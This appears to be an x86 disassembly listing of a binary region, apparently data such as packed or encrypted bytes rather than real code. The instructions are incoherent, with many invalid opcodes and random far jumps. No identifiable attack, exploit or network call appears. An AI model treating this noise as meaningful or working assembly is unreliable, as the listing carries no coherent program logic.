  420583:	jmp    0x7bb3:0x7e033b5f
  42058a:	mov    esp,?
  42058c:	aaa    
  42058d:	mov    DWORD PTR [ebx-0x75],eax
  420590:	pop    ebp
  420591:	push   edi
  420592:	sbb    dh,0x22
  420595:	bnd jmp 0x42056c
  420598:	rcl    dh,cl
  42059a:	stc    
  42059b:	and    al,0x76
  42059e:	push   ebx
  42059f:	nop
  4205a0:	test   al,0xb4
  4205a2:	xchg   esp,eax
  4205a3:	or     cl,BYTE PTR [esi]
  4205a5:	jmp    0x3e0832a2
  4205aa:	and    DWORD PTR [ebx+0x5f],0x68
  4205ae:	xor    DWORD PTR [edx+0x16769c33],eax
  4205b4:	stc    
  4205b5:	adc    al,0x3f
  4205b7:	fnstenv [eax+0x37]
  4205ba:	cld    
  4205bb:	sbb    BYTE PTR ds:0xc044e44a,dh
  4205c1:	push   es
  4205c2:	(bad)  
  4205c3:	aaa    
  4205c4:	push   edi
  4205c5:	mov    ah,0x56
  4205c7:	cdq    
  4205c8:	sbb    edx,DWORD PTR [edx]
  4205ca:	xchg   esi,eax
  4205cb:	mov    BYTE PTR [edi],0xa7
  4205ce:	inc    esi
  4205cf:	outs   dx,DWORD PTR ds:[esi]
  4205d0:	mov    ebp,0xca83f29a
  4205d5:	mov    al,0xfc
  4205d7:	mov    eax,ds:0x54dd34c
  4205dc:	inc    esp
  4205dd:	aas    
  4205de:	ret    
  4205df:	or     ah,cl
  4205e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205e2:	addr16 sbb esi,ebp
  4205e5:	mov    al,0xc5
  4205e7:	xchg   edx,eax
  4205e8:	iret   
  4205e9:	cwde   
  4205ea:	cmp    DWORD PTR [ebx*4-0xa981f77],esp
  4205f1:	cs push ds
  4205f3:	xlat   BYTE PTR ds:[ebx]
  4205f4:	inc    esp
  4205f5:	pop    edx
  4205f6:	or     DWORD PTR [ebp-0x6e],edi
  4205f9:	fnsave [esi+0xf04c96a]
  4205ff:	(bad)  
  420600:	in     al,dx
  420601:	mov    edi,0x616de989
  420606:	jbe    0x420631
  420608:	dec    edi
  420609:	xchg   ebp,eax
  42060a:	jl     0x4205a6
  42060c:	shl    BYTE PTR [eax-0x26715e26],0x1
  420613:	mov    eax,0xda4200f3
  420618:	xchg   esi,eax
  420619:	jno    0x4205c2
  42061b:	jnp    0x4205a0
  42061d:	scas   eax,DWORD PTR es:[edi]
  42061e:	add    BYTE PTR [ecx+0x16],bl
  420621:	popf   
  420622:	mov    DWORD PTR [ecx],ebp
  420624:	xchg   esp,eax
  420625:	out    dx,al
  420626:	(bad)  
  420627:	lahf   
  420628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420629:	pop    ss
  42062a:	ret    0xc01c
  42062d:	rol    BYTE PTR [edx-0x1383c563],cl
  420633:	mov    eax,ds:0x6d577701
  420638:	xchg   esp,edi
  42063a:	jl     0x4205d1
  42063c:	push   edi
  42063d:	ins    DWORD PTR es:[edi],dx
  42063e:	cmp    eax,0xa93ca817
  420643:	and    DWORD PTR [ebx+0x5b350dc2],edx
  420649:	jp     0x4205e2
  42064b:	rol    BYTE PTR [ebx+0xfb5ee5f],cl
  420651:	into   
  420652:	inc    ecx
  420653:	loop   0x420664
  420655:	jnp    0x42065e
  420657:	sahf   
  420658:	loopne 0x4206ba
  42065a:	in     eax,0xd3
  42065c:	adc    bl,BYTE PTR [edx+0x1a]
  42065f:	mov    ebp,0x2feb0749
  420664:	xor    DWORD PTR ds:0xe2fdd5ce,ecx
  42066a:	sti    
  42066b:	xchg   esi,eax
  42066c:	sbb    DWORD PTR es:[ebx],edi
  42066f:	sub    bh,BYTE PTR [ecx+0x4]
  420672:	dec    esi
  420673:	jbe    0x42060f
  420675:	xor    al,0x2
  420677:	mov    WORD PTR [ebx],?
  420679:	mov    ch,0x8f
  42067b:	loop   0x4206a8
  42067d:	int3   
  42067e:	push   eax
  42067f:	xchg   esp,eax
  420680:	or     cl,bl
  420682:	fs call 0xcf1c:0x1303909
  42068a:	dec    edx
  42068b:	sbb    al,BYTE PTR [edi+0x30]
  42068e:	pushf  
  42068f:	xchg   esp,esp
  420691:	xchg   ebp,eax
  420692:	loopne 0x4206b1
  420694:	mov    BYTE PTR [esi-0x29],bh
  420697:	sbb    BYTE PTR [eax-0x4085aac],cl
  42069d:	into   
  42069e:	xchg   BYTE PTR [edi-0x2d],bl
  4206a1:	dec    edi
  4206a2:	stos   BYTE PTR es:[edi],al
  4206a3:	or     al,BYTE PTR [edx-0x40b66c18]
  4206a9:	test   DWORD PTR [ebx],ebx
  4206ab:	mov    WORD PTR [ebx],?
  4206ad:	mov    dh,0x98
  4206af:	in     al,dx
  4206b0:	mov    ecx,0x21be1d21
  4206b5:	stc    
  4206b6:	xor    ebp,DWORD PTR [ebx+0x1813d07c]
  4206bc:	pop    edi
  4206bd:	inc    ebp
  4206be:	fcomp  QWORD PTR [edi+0x7bd00e7f]
  4206c4:	retf   
  4206c5:	lahf   
  4206c6:	sub    DWORD PTR [ebx+0x18],ebx
  4206c9:	sub    bl,BYTE PTR [esi-0x23]
  4206cc:	cmp    ah,ch
  4206ce:	jle    0x420727
  4206d0:	pusha  
  4206d1:	f2xm1  
  4206d3:	mov    dh,0xb1
  4206d5:	xor    BYTE PTR [esi],ch
  4206d7:	inc    esi
  4206d8:	inc    esi
  4206d9:	and    DWORD PTR [edx+0x346575c5],eax
  4206df:	push   edi
  4206e0:	cmp    al,0xe4
  4206e2:	imul   esi,edx,0xbb90d6
  4206e8:	ds out 0xb7,al
  4206eb:	stos   BYTE PTR es:[edi],al
  4206ec:	xchg   esi,eax
  4206ed:	loope  0x420749
  4206ef:	sub    eax,0xbdfe9de8
  4206f4:	stc    
  4206f5:	xadd   BYTE PTR [edi+0x27],cl
  4206f9:	iret   
  4206fa:	lahf   
  4206fb:	inc    ebp
  4206fc:	sub    dh,bl
  4206fe:	push   ebx
  4206ff:	mov    ds:0xb908a4aa,al
  420704:	fwait
  420705:	call   0x4fb3:0xa68f3e73
  42070c:	inc    ebp
  42070d:	xchg   ebp,eax
  42070e:	push   cs
  42070f:	dec    ebx
  420710:	adc    bh,BYTE PTR [eax-0x1a]
  420713:	popf   
  420714:	add    eax,0xb28f922
  420719:	mov    fs,WORD PTR [ebx-0x26184512]
  42071f:	mov    esi,0xa36e7cc4
  420724:	push   ds
  420725:	test   BYTE PTR [eax+0x5b494cf4],ch
  42072b:	leave  
  42072c:	xlat   BYTE PTR ds:[ebx]
  42072d:	shl    BYTE PTR [edi],0xdb
  420730:	jb     0x42075d
  420732:	sar    bh,1
  420734:	js     0x42074e
  420736:	es ins BYTE PTR es:[edi],dx
  420738:	int3   
  420739:	sbb    al,0xe7
  42073b:	test   eax,0x58334fd4
  420740:	cmp    DWORD PTR [edi],edi
  420742:	lea    edx,[edx]
  420744:	sbb    ah,BYTE PTR [edx+0x3a]
  420747:	mov    cl,0x6f
  420749:	enter  0x59b8,0x8a
  42074d:	fld    DWORD PTR [edi-0xa39865e]
  420753:	pusha  
  420754:	out    dx,al
  420755:	xor    ebx,ebx
  420757:	(bad)  
  420758:	and    eax,0x2f820455
  42075d:	jl     0x42075e
  42075f:	outs   dx,BYTE PTR ds:[esi]
  420760:	xor    esp,DWORD PTR [ecx]
  420762:	lea    eax,[edx-0x786e3c9f]
  420768:	push   esp
  420769:	lds    ebp,FWORD PTR [ecx]
  42076b:	ret    0xf9b1
  42076e:	push   0xffffffa5
  420770:	div    bl
  420772:	test   al,0x38
  420774:	into   
  420775:	lods   al,BYTE PTR ds:[esi]
  420776:	clc    
  420777:	(bad)  
  420778:	pop    ebx
  420779:	loopne 0x4207de
  42077b:	xor    al,0x57
  42077d:	popa   
  42077e:	(bad)  
  420780:	mov    ds:0x3f2af291,eax
  420785:	xchg   esp,eax
  420786:	ins    DWORD PTR es:[edi],dx
  420787:	loope  0x420803
  420789:	leave  
  42078a:	sub    eax,esp
  42078c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42078d:	cmp    DWORD PTR [edi-0x2bce8d7b],esi
  420793:	aad    0xa1
  420795:	inc    esi
  420796:	idiv   DWORD PTR [esi+0x2c]
  420799:	js     0x4207de
  42079b:	lea    edi,[ebx-0x4b]
  42079e:	add    esp,DWORD PTR ds:0x584a552f
  4207a4:	adc    al,0x6c
  4207a6:	inc    edx
  4207a7:	add    al,0x30
  4207a9:	aad    0xa1
  4207ab:	and    cl,BYTE PTR [eax-0x56]
  4207ae:	mov    ebp,0x1dfdc43f
  4207b3:	and    al,0x9f
  4207b5:	ja     0x420772
  4207b7:	xchg   edx,eax
  4207b8:	arpl   WORD PTR [ebp-0xd],bx
  4207bb:	ins    BYTE PTR es:[edi],dx
  4207bc:	sub    DWORD PTR [ebx-0x10],ebx
  4207bf:	scas   eax,DWORD PTR es:[edi]
  4207c0:	in     eax,dx
  4207c1:	(bad)  
  4207c2:	jmp    0x4207f6
  4207c4:	ins    DWORD PTR es:[edi],dx
  4207c5:	pop    ds
  4207c6:	sar    DWORD PTR [eax],cl
  4207c8:	inc    ebp
  4207c9:	or     ebx,edx
  4207cb:	or     DWORD PTR [edi+0x5a],eax
  4207ce:	clc    
  4207cf:	fimul  WORD PTR [esi]
  4207d1:	sub    eax,0x5f44200e
  4207d6:	dec    ecx
  4207d7:	mov    esi,0x7a03dc57
  4207dc:	push   eax
  4207dd:	and    edi,ebp
  4207df:	call   0xd198:0xd3de9809
  4207e6:	inc    esi
  4207e7:	in     eax,0x5a
  4207e9:	xchg   esi,eax
  4207ea:	add    BYTE PTR [eax-0x15],cl
  4207ed:	jle    0x42078f
  4207ef:	mov    ebp,0x19fdfe26
  4207f4:	retf   0x5216
  4207f7:	aaa    
  4207f8:	inc    esi
  4207f9:	jecxz  0x4207fa
  4207fb:	mov    bl,0x56
  4207fd:	aam    0x15
  4207ff:	mov    ds:0xf2b70129,al
  420804:	scas   eax,DWORD PTR es:[edi]
  420805:	ret    0xcd25
  420808:	pop    ecx
  420809:	mov    bh,0xb9
  42080b:	push   ss
  42080c:	clc    
  42080d:	sbb    DWORD PTR cs:[ebx],esi
  420810:	ficomp WORD PTR [ecx-0x7e]
  420813:	clc    
  420814:	aam    0x21
  420816:	cwde   
  420817:	sub    eax,0xb217a129
  42081c:	fld    TBYTE PTR ds:0x5f7de5dc
  420822:	pop    ebx
  420823:	retf   
  420824:	retf   0xf6d8
  420827:	adc    eax,0xc1f72bfd
  42082c:	outs   dx,BYTE PTR ds:[esi]
  42082d:	jl     0x420871
  42082f:	test   DWORD PTR [ebx-0x4c8de395],0x89768c75
  420839:	outs   dx,BYTE PTR ds:[esi]
  42083a:	fsubr  DWORD PTR [ebp-0x3e]
  42083d:	xor    dl,ch
  42083f:	aad    0xee
  420841:	mov    cl,0x3c
  420843:	mov    eax,ds:0x4628a4fb
  420848:	in     eax,0x57
  42084a:	bound  eax,QWORD PTR [ebx+0x54]
  42084d:	int    0xb3
  42084f:	retf   0x8a5b
  420852:	mov    BYTE PTR [edx+0x3707c7ff],cl
  420858:	inc    edi
  420859:	lods   eax,DWORD PTR ds:[esi]
  42085a:	cli    
  42085b:	jecxz  0x4208db
  42085d:	or     BYTE PTR [edi],ah
  42085f:	addr16 jo 0x4207e2
  420862:	mov    bh,0xd9
  420864:	xchg   ebx,eax
  420865:	aas    
  420866:	and    ebp,esi
  420868:	push   ebp
  420869:	retf   0x92c6
  42086c:	std    
  42086d:	mov    al,0x23
  42086f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420870:	sahf   
  420871:	mov    eax,ds:0x4e206743
  420876:	clc    
  420877:	rol    ebx,1
  420879:	jb     0x4208ee
  42087b:	int    0x37
  42087d:	fxch   st(2)
  42087f:	scas   al,BYTE PTR es:[edi]
  420880:	fs in  al,0xd0
  420883:	push   0xffffffef
  420885:	popf   
  420886:	icebp  
  420887:	push   esi
  420888:	ja     0x420875
  42088a:	sub    eax,0x1c164e7e
  42088f:	sbb    DWORD PTR [edx],esp
  420891:	inc    eax
  420892:	frstor [edx]
  420894:	or     al,0x1a
  420896:	pop    ds
  420897:	xchg   edx,eax
  420898:	sbb    DWORD PTR [edi-0x21469f5e],ebx
  42089e:	push   es
  42089f:	push   eax
  4208a0:	pop    es
  4208a1:	shl    BYTE PTR [ebp-0x5],cl
  4208a4:	pop    edx
  4208a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208a6:	sub    BYTE PTR [esi],dh
  4208a8:	mov    al,0xd3
  4208aa:	pop    es
  4208ab:	mov    eax,ds:0x4bfaeaa4
  4208b0:	add    BYTE PTR [ebx-0x3d],ah
  4208b3:	jb     0x42084e
  4208b5:	pop    es
  4208b6:	dec    esi
  4208b7:	or     esp,DWORD PTR [ebp-0x4200620d]
  4208bd:	sub    dh,BYTE PTR [ecx]
  4208bf:	arpl   WORD PTR [edx],dx
  4208c1:	fdivr  DWORD PTR [eax+0x6e]
  4208c4:	cmp    esi,DWORD PTR [eax]
  4208c6:	xchg   edi,eax
  4208c7:	sbb    DWORD PTR [edx+0x47],edi
  4208ca:	sahf   
  4208cb:	add    dh,BYTE PTR [esi+0x545cccd1]
  4208d1:	in     eax,dx
  4208d2:	addr16 test al,0x61
  4208d5:	mul    BYTE PTR [ecx+0x53]
  4208d8:	sub    eax,DWORD PTR [edi+eiz*2-0x56]
  4208dc:	push   ebp
  4208dd:	aam    0x11
  4208df:	sbb    DWORD PTR [esi],edx
  4208e1:	push   edi
  4208e2:	mov    BYTE PTR [eax-0x1891b9a4],dl
  4208e8:	push   esi
  4208e9:	lock sar DWORD PTR [ecx+0x7b35593b],cl
  4208f0:	mov    edi,0xbac8b952
  4208f5:	mov    WORD PTR [edx+eiz*2+0x32],gs
  4208f9:	mov    dh,0x9b
  4208fb:	retf   
  4208fc:	adc    DWORD PTR [eax+eiz*1+0x4b],edx
  420900:	addr16 jg 0x4208a0
  420903:	pop    edx
  420904:	std    
  420905:	test   al,0x20
  420907:	xor    ah,bl
  420909:	inc    ebx
  42090a:	sub    eax,0xbcc1a333
  42090f:	pushf  
  420910:	adc    al,0x43
  420912:	ins    DWORD PTR es:[edi],dx
  420913:	popw   ds
  420915:	dec    ebp
  420916:	call   0x71c62873
  42091b:	jne    0x420992
  42091d:	fbld   TBYTE PTR ds:0xa423adf3
  420923:	sahf   
  420924:	push   esp
  420925:	add    BYTE PTR [eax-0x66a15251],ch
  42092b:	outs   dx,DWORD PTR ds:[esi]
  42092c:	int3   
  42092d:	test   BYTE PTR [esi],dh
  42092f:	aaa    
  420930:	mov    BYTE PTR [ecx+0x227abdeb],0xd7
  420937:	push   ebx
  420938:	loopne 0x420963
  42093a:	popf   
  42093b:	inc    ebp
  42093c:	sbb    esi,esi
  42093e:	push   0x3144d938
  420943:	les    esi,FWORD PTR [edi+0x3a529d9f]
  420949:	bound  edi,QWORD PTR [ebx+0x17]
  42094c:	dec    edx
  42094d:	lods   eax,DWORD PTR ds:[esi]
  42094e:	rol    BYTE PTR [ecx+0x1c7127e3],0x7f
  420955:	cmp    DWORD PTR ds:0xdd6d36e1,ebx
  42095b:	imul   DWORD PTR [edx+0x5a]
  42095e:	dec    edx
  42095f:	xchg   dl,cl
  420961:	pop    edx
  420962:	push   cs
  420963:	pop    esi
  420964:	stos   DWORD PTR es:[edi],eax
  420965:	into   
  420966:	pop    edx
  420967:	or     al,0xe4
  420969:	dec    edi
  42096a:	fwait
  42096b:	jmp    0x42092f
  42096d:	stos   BYTE PTR es:[edi],al
  42096e:	inc    edi
  42096f:	in     eax,dx
  420970:	lea    esi,[edi+0x40]
  420973:	and    eax,0xd53cb212
  420978:	daa    
  420979:	gs inc edi
  42097b:	lods   al,BYTE PTR ds:[esi]
  42097c:	or     DWORD PTR [edx],esi
  42097e:	aam    0x0
  420980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420981:	pushf  
  420982:	fstp   TBYTE PTR [eax-0x1af4bcff]
  420988:	sahf   
  420989:	int    0xa1
  42098b:	jns    0x4209da
  42098d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42098e:	pop    esp
  42098f:	out    dx,al
  420990:	dec    eax
  420991:	sbb    DWORD PTR [edx],0xffffff9f
  420994:	xor    DWORD PTR [eax+0x2f],ecx
  420997:	stos   DWORD PTR es:[edi],eax
  420998:	aas    
  420999:	xor    DWORD PTR [edi],edi
  42099b:	inc    edi
  42099c:	leave  
  42099d:	inc    esi
  42099e:	aam    0x7f
  4209a0:	xor    edi,DWORD PTR [esi+0x18]
  4209a3:	mov    ch,0x90
  4209a5:	test   esp,0x67ca4f9b
  4209ab:	pop    ebp
  4209ac:	retf   
  4209ad:	fneni(8087 only) 
  4209af:	mov    al,ss:0x7926c70a
  4209b5:	adc    cl,0xd0
  4209b8:	aad    0xde
  4209ba:	call   0xd67e:0xabe4cf28
  4209c1:	cld    
  4209c2:	xor    BYTE PTR [edx+0xd],dh
  4209c5:	sub    eax,0xa6230b64
  4209ca:	cmp    esi,DWORD PTR [ebx]
  4209cc:	pop    es
  4209cd:	mov    esi,0x160e8a26
  4209d2:	sbb    BYTE PTR [edx],0xbf
  4209d5:	push   eax
  4209d6:	test   al,0x3
  4209d8:	xchg   DWORD PTR [edi-0x1522c16e],edi
  4209de:	mov    esi,0xc750ddb7
  4209e3:	cmp    al,0x86
  4209e5:	mov    dl,0x1e
  4209e7:	add    edx,ebx
  4209e9:	or     al,BYTE PTR [edx+0x19]
  4209ec:	or     al,0x27
  4209ee:	sub    ch,dl
  4209f0:	leave  
  4209f1:	sub    edi,DWORD PTR [edi-0x5866bf9e]
  4209f7:	iret   
  4209f8:	jb     0x420a0c
  4209fa:	dec    ebx
  4209fb:	cwde   
  4209fc:	int3   
  4209fd:	loop   0x42099c
  4209ff:	cmp    eax,esp
  420a01:	and    bh,BYTE PTR [esi]
  420a03:	mov    al,0xb8
  420a05:	aam    0x2e
  420a07:	xchg   ecx,eax
  420a08:	jnp    0x4209ff
  420a0a:	mov    ebp,0x4117464f
  420a0f:	bound  edi,QWORD PTR [edx-0x7e8cb717]
  420a15:	fadd   st,st(0)
  420a17:	lods   al,BYTE PTR ds:[esi]
  420a18:	push   cs
  420a19:	lahf   
  420a1a:	push   esi
  420a1b:	dec    ebx
  420a1c:	ret    
  420a1d:	scas   eax,DWORD PTR es:[edi]
  420a1e:	mov    eax,ds:0xd1e03272
  420a23:	shr    esp,1
  420a25:	mul    ah
  420a27:	std    
  420a28:	pusha  
  420a29:	shr    edi,0x7
  420a2c:	mov    WORD PTR [eax+0x6f8b2983],?
  420a32:	ja     0x420a93
  420a34:	add    DWORD PTR [ebx],0x66
  420a37:	xchg   ecx,eax
  420a38:	cmp    ah,BYTE PTR [eax]
  420a3a:	push   esp
  420a3b:	or     DWORD PTR [edi],0xc324e0a7
  420a41:	pop    edi
  420a42:	mov    bl,0x5
  420a44:	retf   
  420a45:	enter  0xe37f,0x7a
  420a49:	mov    ?,esp
  420a4b:	pop    ecx
  420a4c:	and    al,0x36
  420a4e:	or     DWORD PTR [ebx-0x401960ad],edi
  420a54:	cmp    edx,DWORD PTR [edi+eiz*8+0x71]
  420a58:	xchg   esi,eax
  420a59:	in     eax,0xa0
  420a5b:	add    BYTE PTR [ebp+0x52],al
  420a5e:	aad    0x1d
  420a60:	shr    BYTE PTR [edi-0x34],1
  420a63:	out    dx,eax
  420a64:	xor    dh,0xce
  420a67:	push   ss
  420a68:	xor    al,0x58
  420a6a:	lahf   
  420a6b:	stos   DWORD PTR es:[edi],eax
  420a6c:	fisttp WORD PTR [edx+ebx*2-0x23]
  420a70:	mov    ebp,0xb6e66f43
  420a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a76:	xchg   ecx,eax
  420a77:	loope  0x420ad3
  420a79:	adc    ebp,edi
  420a7b:	add    edx,DWORD PTR [eax+0x18]
  420a7e:	pop    es
  420a7f:	fcmovne st,st(5)
  420a81:	mov    BYTE PTR [eax],cl
  420a83:	sbb    ebx,DWORD PTR [eax+0x49eaf89c]
  420a89:	mov    esp,0x47e471fb
  420a8e:	test   eax,0x2c7cec7b
  420a93:	test   BYTE PTR [eax+0x28],ch
  420a96:	mov    ds:0x18e6d0f4,al
  420a9b:	xchg   BYTE PTR [esi-0x28c848d],bl
  420aa1:	xor    ebx,DWORD PTR ds:0xa47d8862
  420aa7:	jne    0x420af9
  420aa9:	jb     0x420a47
  420aab:	mov    al,0x98
  420aad:	inc    eax
  420aae:	pop    esi
  420aaf:	sub    edi,DWORD PTR [ecx+0x30c76f22]
  420ab5:	jp     0x420a96
  420ab7:	leave  
  420ab8:	shr    BYTE PTR [ebx*2-0x179699cc],0xaf
  420ac0:	xchg   edx,eax
  420ac1:	loop   0x420a69
  420ac3:	adc    al,0xc2
  420ac5:	dec    edi
  420ac6:	cmp    WORD PTR [ecx],dx
  420ac9:	mov    ah,0x14
  420acb:	xchg   ecx,eax
  420acc:	call   0x9a5c0b8f
  420ad1:	cmp    eax,0x5d7d74d5
  420ad6:	mov    esi,0x68a6138c
  420adb:	or     al,0xbd
  420add:	in     eax,dx
  420ade:	dec    edx
  420adf:	outs   dx,DWORD PTR ds:[si]
  420ae1:	aam    0xc0
  420ae3:	mov    bh,0x8b
  420ae5:	mov    al,0xe2
  420ae7:	pop    esi
  420ae8:	mov    edx,0xd046e54a
  420aed:	cmp    DWORD PTR [esi],esp
  420aef:	jle    0x420aa5
  420af1:	jecxz  0x420acf
  420af3:	hlt    
  420af4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420af5:	mov    dl,0x7b
  420af7:	jne    0x420b16
  420af9:	pop    ecx
  420afa:	sub    al,0x84
  420afc:	xor    BYTE PTR [ebx-0x68],dh
  420aff:	imul   esp,DWORD PTR [ebx+0x3b],0x90b04148
  420b06:	imul   esp,DWORD PTR [edi+0x15],0x3a
  420b0a:	ret    0x7272
  420b0d:	mov    ebp,0xcbb5180e
  420b12:	push   es
  420b13:	xchg   esp,eax
  420b14:	or     cl,ch
  420b16:	push   0xffffff82
  420b18:	mov    dh,0x35
  420b1b:	arpl   WORD PTR [edx+0x618c2c28],cx
  420b21:	test   cl,dl
  420b23:	xor    eax,ecx
  420b25:	and    al,bh
  420b27:	lea    esp,[ebx+eax*4-0x65]
  420b2b:	lock je 0x420ae0
  420b2e:	leave  
  420b2f:	inc    ecx
  420b30:	xchg   DWORD PTR [edx],edi
  420b32:	jnp    0x420b21
  420b34:	bound  edx,QWORD PTR [eax+0x30]
  420b37:	sub    DWORD PTR [eax+ebp*1+0x2f],edx
  420b3b:	cmp    bl,cl
  420b3d:	sbb    bh,BYTE PTR [ebx-0x4e]
  420b40:	cmp    al,0x7
  420b42:	adc    BYTE PTR [eax+ebp*4],cl
  420b45:	jnp    0x420b5e
  420b47:	and    al,0xd8
  420b49:	push   esp
  420b4a:	mov    eax,ds:0xbaa4583a
  420b4f:	adc    DWORD PTR [edi+0x3d26e39b],0x79
  420b56:	(bad)  
  420b57:	or     eax,0xb733e0d5
  420b5c:	(bad)  
  420b5d:	sar    ecx,cl
  420b5f:	mov    esi,0x669dea8
  420b64:	repz call 0xa56d:0xcdffebf0
  420b6c:	nop
  420b6d:	inc    edx
  420b6e:	mov    dh,0x8d
  420b70:	pop    esp
  420b71:	push   ss
  420b72:	clc    
  420b73:	mov    bl,0x8c
  420b75:	jecxz  0x420b30
  420b77:	iret   
  420b78:	ret    
  420b79:	push   0xffffffb9
  420b7b:	fsubrp st(7),st
  420b7d:	retf   0x6663
  420b80:	cmp    esi,DWORD PTR [eax-0x4d5842fd]
  420b86:	lods   al,BYTE PTR ds:[esi]
  420b87:	pop    esi
  420b88:	push   esp
  420b8a:	into   
  420b8b:	ss inc edi
  420b8d:	out    0x6b,eax
  420b8f:	and    al,0x5c
  420b91:	lock mov edi,0x9c7303e5
  420b97:	les    esp,FWORD PTR [ebx+0x40058aea]
  420b9d:	jge    0x420b90
  420b9f:	and    dh,BYTE PTR [edx-0x40103031]
  420ba5:	xlat   BYTE PTR ds:[ebx]
  420ba6:	sbb    BYTE PTR [eax-0x29ee77b8],0x30
  420bad:	pop    ecx
  420bae:	mov    ebp,0x1d9ae83b
  420bb3:	int3   
  420bb4:	outs   dx,DWORD PTR ds:[esi]
  420bb5:	jl     0x420bc2
  420bb7:	jnp    0x420ba9
  420bb9:	or     BYTE PTR [eax-0x2dc26100],cl
  420bbf:	jmp    0x420bfb
  420bc1:	mov    ss,WORD PTR [edx+eax*8-0x4afd10ae]
  420bc8:	inc    esi
  420bc9:	mov    bl,dh
  420bcb:	rep outs dx,DWORD PTR ds:[esi]
  420bcd:	add    edi,ecx
  420bcf:	imul   ecx,DWORD PTR [edx-0x4b2f156],0x5e
  420bd6:	inc    ebp
  420bd7:	mov    bh,bl
  420bd9:	les    ebp,FWORD PTR [esi-0x6c]
  420bdc:	push   edi
  420bdd:	out    0x11,eax
  420bdf:	sub    DWORD PTR [ecx-0x48],0xfe62738f
  420be6:	dec    edi
  420be7:	call   0xfb97058b
  420bec:	pop    esi
  420bed:	pop    esi
  420bee:	mul    DWORD PTR ds:0xa5c761dc
  420bf4:	pop    esp
  420bf5:	jmp    0xa34e:0xf7aa925c
  420bfc:	jp     0x420bda
  420bfe:	sbb    DWORD PTR [edi-0xc],0xf11cc075
  420c05:	sti    
  420c06:	or     DWORD PTR ds:0x8a99bb87,esi
  420c0c:	pop    edi
  420c0d:	pop    ebp
  420c0e:	pop    ebp
  420c0f:	dec    eax
  420c10:	daa    
  420c11:	lea    edx,[edi-0x64]
  420c14:	jbe    0x420c4a
  420c16:	out    0xd,al
  420c18:	push   edx
  420c19:	sbb    BYTE PTR [esi],dh
  420c1b:	out    0x59,eax
  420c1d:	cmp    dh,BYTE PTR [ebp-0x1204c6c4]
  420c23:	loopne 0x420c01
  420c25:	popf   
  420c26:	inc    eax
  420c27:	jge    0x420c5f
  420c29:	push   edx
  420c2a:	pushf  
  420c2b:	sar    ecx,1
  420c2d:	mov    ebx,0xd7edbed3
  420c32:	and    esp,eax
  420c34:	gs das 
  420c36:	ins    BYTE PTR es:[edi],dx
  420c37:	(bad)  
  420c38:	mov    ds:0x67a94602,al
  420c3d:	mov    eax,ds:0x7a281535
  420c42:	mov    al,0x50
  420c44:	(bad)  
  420c45:	xchg   DWORD PTR [edi],edi
  420c47:	aaa    
  420c48:	dec    ecx
  420c49:	push   eax
  420c4a:	xor    ebx,ebp
  420c4c:	xlat   BYTE PTR ds:[ebx]
  420c4d:	mov    ds:0x39b37754,eax
  420c52:	jbe    0x420c60
  420c54:	loopne 0x420c9c
  420c56:	cmp    al,0x60
  420c58:	mov    esp,0xe0389aed
  420c5d:	push   ds
  420c5e:	dec    ebx
  420c5f:	das    
  420c60:	and    BYTE PTR [ebx],ch
  420c62:	cmc    
  420c63:	fs mov ebx,0xaa7c1670
  420c69:	and    esi,DWORD PTR gs:[ebp-0x6e]
  420c6d:	xchg   ebx,eax
  420c6e:	and    BYTE PTR [esi-0x7],dh
  420c71:	push   es
  420c72:	jnp    0x420c79
  420c74:	clc    
  420c75:	dec    ebx
  420c76:	xor    al,0xdb
  420c78:	sbb    BYTE PTR [esi+eax*4-0xa],ah
  420c7c:	inc    esp
  420c7d:	inc    edx
  420c7e:	inc    ecx
  420c7f:	and    bl,BYTE PTR [ebx+0x59feccdb]
  420c85:	lock inc edx
  420c87:	jno    0x420c26
  420c89:	mov    ch,0xd3
  420c8b:	push   eax
  420c8c:	loopne 0x420c2d
  420c8e:	jnp    0x420cbb
  420c90:	shl    DWORD PTR [esi-0x6feb6ca8],0xe5
  420c97:	dec    ebx
  420c98:	and    eax,0xf87fe527
  420c9d:	in     eax,dx
  420c9e:	(bad)  
  420c9f:	dec    esp
  420ca0:	test   al,0x78
  420ca2:	clc    
  420ca3:	cmp    al,0xd9
  420ca5:	push   0xbded1e35
  420caa:	data16 js 0x420c89
  420cad:	retf   
  420cae:	sbb    bh,BYTE PTR [ebp-0x202ed809]
  420cb4:	(bad)
  420cb8:	mov    WORD PTR [eax],ds
  420cba:	(bad)  
  420cbb:	jmp    0x9d0118fb
  420cc0:	repz shl DWORD PTR [edx],1
  420cc3:	lods   eax,DWORD PTR ds:[esi]
  420cc4:	ins    BYTE PTR es:[edi],dx
  420cc5:	sbb    eax,0xfa53790a
  420cca:	sbb    al,0x3a
  420ccc:	sti    
  420ccd:	loop   0x420cd5
  420ccf:	xchg   edi,eax
  420cd0:	(bad)  
  420cd2:	jg     0x420d06
  420cd4:	cdq    
  420cd5:	les    ebp,FWORD PTR [edi]
  420cd7:	js     0x420ce0
  420cd9:	gs mov al,0x47
  420cdc:	add    BYTE PTR [edx-0x3c],bh
  420cdf:	test   eax,edi
  420ce1:	out    dx,eax
  420ce2:	mov    eax,0xe7f782ca
  420ce7:	mov    al,ds:0x4b80f1a5
  420cec:	push   esp
  420ced:	cmp    DWORD PTR [ebx-0x32],edx
  420cf0:	and    ebx,DWORD PTR [edx]
  420cf2:	sub    BYTE PTR [ecx],bl
  420cf4:	sbb    eax,0x44e73806
  420cf9:	imul   BYTE PTR [ebp+0x7f03d69e]
  420cff:	dec    edi
  420d00:	xchg   edx,eax
  420d01:	(bad)
  420d05:	dec    eax
  420d06:	sub    eax,0x7bf53ce
  420d0b:	push   esp
  420d0c:	or     al,0x55
  420d0e:	lods   al,BYTE PTR ds:[esi]
  420d0f:	sar    DWORD PTR ds:0x8724d8e6,0xd9
  420d16:	sbb    ebp,DWORD PTR [edi]
  420d18:	hlt    
  420d19:	push   es
  420d1a:	or     cl,BYTE PTR [ebp+edx*1+0x51b927d0]
  420d21:	frstor [eax+0x34]
  420d24:	sbb    edx,eax
  420d26:	ss daa 
